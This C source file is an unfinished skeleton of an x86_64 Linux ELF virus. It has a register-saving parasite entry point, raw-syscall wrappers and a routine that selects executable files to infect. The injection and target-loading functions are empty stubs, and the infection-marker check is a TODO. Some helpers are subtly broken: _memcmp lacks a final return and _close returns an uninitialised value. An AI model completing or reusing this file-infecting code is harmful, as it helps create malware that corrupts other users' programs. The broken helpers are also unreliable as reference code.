#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <elf.h>

/* libc */
void _memcpy(void *dst, void *src, unsigned int len);
int _memcmp(const void *s1, const void *s2, unsigned int n);

/* syscalls */
void Exit(long);
int _read(long fd, char *buf, unsigned long len);
long _write(long fd, char *buf, unsigned long len);
int _close(unsigned int fd);
long _open(const char *path, unsigned long flags, long mode);

#define __ASM__ __asm__ __volatile__
#define PAGE_SIZE 4096

typedef struct elfbin {
	/* Headers */
	Elf64_Ehdr* ehdr;
	Elf64_Phdr* phdr;
	Elf64_Shdr* shdr;
	/* Memory */	
	uint8_t* mem;
	size_t size;	
	/* File info */
	char* path;
	struct stat st;
	int fd;
	/* Else */
	int original_virus_exe;
} elfbin_t;

int _start() {
	/*
	 * Save register state before executing parasite code.
	 */
	__ASM__(
		".globl real_start	\n"
		"real_start: 		\n"
		"push %rsp 			\n"
		"push %rbp 			\n"
	 	"push %rax			\n"
	 	"push %rbx			\n"
	 	"push %rcx			\n"
	 	"push %rdx			\n"
	 	"push %r8			\n"
	 	"push %r9			\n"
	 	"push %r10			\n"
	 	"push %r11			\n"
	 	"push %r12			\n"
	 	"push %r13			\n"
	 	"push %r14			\n"
	 	"push %r15	  		");

	__ASM__(
		"call do_main 		");

	/*
	 * Restore register state
	*/
	__ASM__(
		"pop %r15			\n"
	 	"pop %r14			\n"
	 	"pop %r13			\n"
	 	"pop %r12			\n"
	 	"pop %r11			\n"
	 	"pop %r10			\n"
	 	"pop %r9			\n"
	 	"pop %r8			\n"
	 	"pop %rdx			\n"
	 	"pop %rcx			\n"
	 	"pop %rbx			\n"
	 	"pop %rax			\n"
	 	"pop %rbp			\n"
	 	"pop %rsp			\n"	
	 	"add $0x8, %rsp		\n"
	 	"jmp end_code		"); 
}

void do_main() {
	/* Declare variables */
	char cwd[2];	
	ssize_t cwd_fd;


	
	/* Code */
	cwd[0] = '.';
	cwd[1] = '\0';

	cwd_fd = _open(cwd, O_RDONLY | O_DIRECTORY, 0);



	
}


int load_target(const char *path) {


}

void inject_parasite(char *host_name, 
					 size_t psize, 
					 size_t hsize, 
					 uint8_t *mem, 
					 size_t end_of_text, 
					 uint8_t* parasite, 
					 uint32_t jmp_code_offset) {
	
}

/*
 * Must be ELF
 * Must be ET_EXEC
 * Must not be yet injected
 */
int check_criteria(char *filename) {
	int fd;
	struct stat st;
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	uint8_t mem[PAGE_SIZE];
	uint32_t magic;

	fd = _open(filename, O_RDONLY, 0);
	if (fd < 0) {
		return -1;
	}
	if (_read(fd, mem, PAGE_SIZE) < 0) {
		return -1;
	}
	_close(fd);
		
	ehdr = (Elf64_Ehdr*)mem;
	phdr = (Elf64_Phdr*)&mem[ehdr->e_phoff];

	/* Check if file is ELF format */
	/* first 4 bits != 0x7fELF */
	if (_memcmp("\x7f\x45\x4c\x46", mem, 4) != 0) {
		return -1;
	}
	
	/* Check if file already infected (has magic) */
	// TODO:	

	/* Check if file is ET_EXEC */
	if (ehdr->e_type != ET_EXEC) {
		return -1;
	}
	
	/* Now supported only x86_64 */
	if (ehdr->e_machine != EM_X86_64) {
		return -1;
	}
	
	return 0;
}

void Exit(long status) {
	__asm__ volatile(
		"mov %0, %%rdi		\n"
		"mov $60, %%rax  	\n"
	    "syscall": : "r"(status));	
}

int _read(long fd, char *buf, unsigned long len) {
         long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov %2, %%rdx\n"
                        "mov $0, %%rax\n"
                        "syscall" : : "g"(fd), "g"(buf), "g"(len));
        asm("mov %%rax, %0" : "=r"(ret));
        return (int)ret;
}

long _write(long fd, char *buf, unsigned long len) {
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov %2, %%rdx\n"
                        "mov $1, %%rax\n"
                        "syscall" : : "g"(fd), "g"(buf), "g"(len));
        asm("mov %%rax, %0" : "=r"(ret));
        return ret;
}

int _close(unsigned int fd) {
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov $3, %%rax\n"
                        "syscall" : : "g"(fd));
        return (int)ret;
}

long _open(const char *path, unsigned long flags, long mode) {
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
			"mov %2, %%rdx\n"
                        "mov $2, %%rax\n"
                        "syscall" : : "g"(path), "g"(flags), "g"(mode));
        asm ("mov %%rax, %0" : "=r"(ret));
        return ret;
}



/* --------------------- LibC ---------------------------------- */

void _memcpy(void *dst, void *src, unsigned int len) {
        int i;
        unsigned char *s = (unsigned char *)src;
        unsigned char *d = (unsigned char *)dst;
        for (i = 0; i < len; i++) {
                *d = *s;
                s++, d++;
        }
}

int _memcmp(const void *s1, const void *s2, unsigned int n) {
        unsigned char u1, u2;
        for ( ; n-- ; s1++, s2++) {
                u1 = * (unsigned char *) s1;
                u2 = * (unsigned char *) s2;
        if ( u1 != u2) {
                return (u1-u2);
        }
    }
}

/*
 * end_code() gets over_written with a trampoline
 * that jumps to the original entry point.
 */
void end_code() {
	Exit(0);
}
